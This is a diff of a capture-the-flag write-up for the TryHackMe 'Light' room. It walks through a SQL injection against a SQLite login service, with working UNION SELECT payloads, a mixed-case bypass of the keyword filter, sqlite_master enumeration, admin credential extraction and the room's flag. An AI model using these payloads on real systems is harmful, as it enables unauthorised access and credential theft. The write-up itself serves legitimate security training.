@@ -2,94 +2,128 @@
 title: "Light"
 slug: "light"
 category: "database-exploitation"
-description: "Light is a beginner-friendly room on TryHackMe that introduces users to basic SQL injection techniques. Through a simple login challenge, you'll explore how improper input handling can expose vulnerabilities in web applications. Great for those starting out in web exploitation!"
+description: "Light is a beginner-friendly room on TryHackMe that introduces SQL injection techniques against a SQLite database application. Through a simple login interface over Netcat, you'll explore how improper input handling can expose vulnerabilities — including input filtering and SQLite-specific syntax quirks."
 date: "2025-06-10"
 ---
 
 # Challenge Setup
 
-## ️Files Provided
+## Service Details
 
 - **Port:** 1337
-- **Username:** smokey
+- **Starting username:** smokey
 
 ## Tools Used:
 
-- nmap (port scanning)
-- netcat (connecting to service)
-- john the ripper (password cracking)
-- CyberChef (decoding attempts)
+- **Nmap** — Port scanning
+- **Netcat** — Connecting to the service and delivering payloads
+- **PayloadsAllTheThings** — SQLite injection payload reference
 
 ## Environment:
 
-- Local Kali Linux VM and THM target machine.
+- Kali Linux (attacker machine)
+- TryHackMe hosted target machine
 
 # Initial Recon
 
-Before starting the challenge, I was given the machine's IP address, the service port (1337), and a username (smokey). I scanned the IP address with `nmap` to check for any other services — only SSH was found, which wasn’t needed for this challenge. After that, I connected directly to the service using `netcat`, and found a login prompt.
+I was given the target IP, port 1337, and a starting username (`smokey`). I ran an Nmap scan first to check for other services — only SSH on port 22 was found, which wasn't relevant to this challenge.
 
-# ️Exploitation / Solution
+I connected to the service on port 1337 using Netcat:
 
-## 1. First Login
-
-- I connected to the machine on try hack me via netcat.
-- I was presented with a login portal on my command line to the database.
-- I then entered the given username `smokey`, which produced a value on the screen.
-- At first I suspected some sort of encoding, so I tried decoding it with CyberChef but no luck.
-
-## 2. Finding out the Encoded Value
-
-- I saved the given "password" into a text file named `password.txt` to come back to if i had any light bulbs go off.
-- Decided to use John the Ripper on the file but, it hinted that the content could be UTF-8 encoding.
-- I then attempted further decoding with CyberChef, but still didn't retrieve anything useful so, i stopped that there.
-
-## 3. Trying SQL Injection
-
-- Attempted SQL queries manually through netcat:
-    - Basic inputs like `select from *` caused errors (bad syntax).
-    - Tried using `' OR 1=1` and variations, leading to different errors.
-    - Experimented with `' OR 1=1 --` which gave new error messages.
-    - After researching SQL payloads, I found a working query:
-
-```sql
-' UNION SELECT null, table_name FROM information_schema.tables --
+```
+nc <target-ip> 1337
 ```
 
-- Initially struggled because the server restricted certain characters, but after testing different versions, I retrieved the admin's username and part of the flag.
+The service presented a login prompt. Entering the username `smokey` returned a password value directly on screen.
 
-## 4. Finding the Username's Password
+My first instinct was that this might be an encoded or hashed value, so I spent time attempting to decode it with CyberChef and crack it with John the Ripper — neither produced anything useful. This turned out to be a dead end: the service was simply returning `smokey`'s password in plaintext, which itself is a red flag indicating poor input handling. The real vulnerability was SQL injection.
 
-- I explored the database schema further and its columns to see if there was any other data.
-- I found an `id` column and retrieved its data.
-- I made a query to filter the password table based on the `id`, which finally revealed the complete password for `smokey` and allowed me to get the final flag.
+# Exploitation / Solution
+
+## Step One — Confirming SQL Injection
+
+I tested the input field with a single quote to see how the application responded:
+
+```
+smokey'
+```
+
+The application returned:
+
+```
+Error: unrecognized token: 'smokey'' LIMIT 30
+```
+
+The `LIMIT 30` clause in the error message is characteristic of **SQLite** — confirming both that SQL injection was possible and that the backend was SQLite specifically, not MySQL or PostgreSQL. This matters because SQLite has different syntax, system tables, and comment handling.
+
+## Step Two — Identifying Filter Restrictions
+
+Standard SQL comment sequences (`--`, `/*`) were blocked by the application, preventing me from terminating injected queries that way. Certain SQL keywords also appeared to be filtered. To bypass keyword filtering, I used mixed-case equivalents (e.g. `UnIoN`, `SeLecT`, `FrOm`) which the application treated as valid SQL but didn't match the filter's blocklist.
+
+Instead of terminating with `--`, payloads were closed with a trailing single quote to keep the query syntactically valid.
+
+## Step Three — Enumerating the Database Schema
+
+In SQLite, `sqlite_master` is the system table that stores metadata about all database objects — the equivalent of `information_schema.tables` in MySQL. I used a UNION SELECT payload to list the table names:
+
+```
+smokey' UnIoN SeLecT tbl_name FrOm sqlite_master WHERE type='table'
+```
+
+This returned the table name: **`admintable`**
+
+I then queried the structure of `admintable` to find its columns:
+
+```
+smokey' UnIoN SeLecT group_concat(sql) FrOm sqlite_master'
+```
+
+This revealed the column names: `id`, `username`, `password`.
+
+## Step Four — Extracting Credentials and the Flag
+
+With the table and column names confirmed, I extracted the admin username:
+
+```
+smokey' UnIoN SeLecT username FrOm admintable WHERE id='1'
+```
+
+Then retrieved the corresponding password:
+
+```
+smokey' UnIoN SeLecT password FrOm admintable WHERE username='<admin-username>'
+```
+
+The password for the admin user was also the final flag.
 
 # Flag
 
-> THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+```
+THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+```
 
 # Tools Used
 
-- **nmap** — Scanned IP address to discover open ports/services.
-- **netcat** — Connected to the service manually.
-- **john the ripper** — Analyzed the provided encoded password.
-- **CyberChef** — Attempted various decoding methods.
-- **SQL Injection payload lists** — Helped craft injections.
+- **Nmap** — Port scanning to identify open services
+- **Netcat** — Connecting to the service and delivering SQL injection payloads
+- **PayloadsAllTheThings (SQLite section)** — Reference for SQLite-specific injection syntax
 
 # Notes / Lessons Learned
 
-- SQL Injection requires creativity, especially when the environment restricts certain characters.
-- It's good practice to save any outputs like hashes or encoded data immediately into a file.
-- Testing payloads manually teaches a lot more than just copy-pasting.
-- Always explore the database structure (information schema) carefully if you have injection access.
+- The error message format (specifically `LIMIT 30`) was the key indicator that the backend was SQLite rather than MySQL or another engine. Reading error messages carefully saves a lot of guesswork.
+- SQLite uses `sqlite_master` to enumerate tables and schema — `information_schema` is MySQL/PostgreSQL syntax and won't work here.
+- Input filters that block comment sequences (`--`, `/*`) can often be worked around by closing the query with a trailing quote instead.
+- Keyword filters based on exact string matching can be bypassed with mixed-case payloads (`SeLecT`, `FrOm`), since SQL is case-insensitive but the filter may not be.
+- When a service returns a user's password in plaintext, that's a serious misconfiguration in itself — but don't stop there. The plaintext return is a symptom of deeper issues, and SQL injection is usually the more impactful vulnerability underneath it.
 
 <carousel>
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_1.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_2.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_3.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_4.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_5.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_6.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_7.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_8.png)
-![Screenshot of the challenge soloution](/images/light/Light_Screenshot_9.png)
+![Screenshot 1](/images/light/Light_Screenshot_1.png)
+![Screenshot 2](/images/light/Light_Screenshot_2.png)
+![Screenshot 3](/images/light/Light_Screenshot_3.png)
+![Screenshot 4](/images/light/Light_Screenshot_4.png)
+![Screenshot 5](/images/light/Light_Screenshot_5.png)
+![Screenshot 6](/images/light/Light_Screenshot_6.png)
+![Screenshot 7](/images/light/Light_Screenshot_7.png)
+![Screenshot 8](/images/light/Light_Screenshot_8.png)
+![Screenshot 9](/images/light/Light_Screenshot_9.png)
 </carousel>
